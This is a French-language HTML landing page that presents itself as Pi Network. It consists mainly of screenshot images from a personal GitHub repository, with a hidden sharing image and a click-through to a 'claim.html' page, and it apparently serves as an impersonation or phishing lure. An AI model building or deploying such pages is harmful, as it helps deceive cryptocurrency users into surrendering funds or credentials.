<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Pi Network - La Cryptomonnaie Accessible</title>
    
    <!-- Balises Open Graph -->
    <meta property="og:title" content="Pi Network - Minez Gratuitement sur Mobile">
    <meta property="og:description" content="Rejoignez Pi Network et commencez à miner la cryptomonnaie Pi dès maintenant sur votre smartphone">
    <meta property="og:image" content="https://i.postimg.cc/4x24G0fV/In-Shot-20250930-204937227.jpg">
    <meta property="og:image:width" content="950">
    <meta property="og:image:height" content="1920">
    <meta property="og:url" content="https://votresite.com/pi-network">
    <meta property="og:type" content="website">
    <meta property="og:locale" content="fr_FR">
    
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="Pi Network - Minez Gratuitement sur Mobile">
    <meta name="twitter:description" content="Rejoignez Pi Network et commencez à miner la cryptomonnaie Pi">
    <meta name="twitter:image" content="https://i.postimg.cc/4x24G0fV/In-Shot-20250930-204937227.jpg">

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background-color: #000;
            min-height: 100vh;
            touch-action: pan-x pan-y;
            -webkit-touch-callout: none;
            -webkit-user-select: none;
            user-select: none;
            overflow-x: hidden;
            position: relative;
        }
        
        .main-image, .continuation-image {
            width: 100%;
            height: auto;
            display: block;
            vertical-align: bottom;
        }
        
        .footer {
            position: fixed;
            bottom: 0;
            left: 0;
            width: 100%;
            z-index: 10;
        }
        
        .footer img {
            width: 100%;
            height: auto;
            display: block;
        }
        
        /* Masquage COMPLET de l'image OG */
        .og-image-container {
            position: absolute;
            top: -9999px;
            left: -9999px;
            width: 1px;
            height: 1px;
            overflow: hidden;
            opacity: 0;
            pointer-events: none;
            z-index: -9999;
        }
    </style>
</head>
<body>
    <!-- Image OG masquée -->
    <div class="og-image-container" aria-hidden="true">
        <img src="https://i.postimg.cc/4x24G0fV/In-Shot-20250930-204937227.jpg" 
             alt="Pi Network - Application Mobile"
             width="950"
             height="1920">
    </div>
    
    <!-- Contenu principal -->
    <img class="main-image" 
         src="https://github.com/Walyy578/Pi-Browser/blob/main/InShot_20250930_103151554.jpg?raw=true" 
         alt="Image principale" 
         onclick="window.location.href='claim.html'">
    
    <img class="continuation-image" 
         src="https://github.com/Walyy578/Pi-Browser/blob/main/Screenshot_20250930-163639.jpg?raw=true" 
         alt="Suite de l'image">
    
    <footer class="footer">
        <img src="https://github.com/Walyy578/Pi-Browser/blob/main/InShot_20250930_165420094.jpg?raw=true" 
             alt="Pied de page">
    </footer>
</body>
</html>
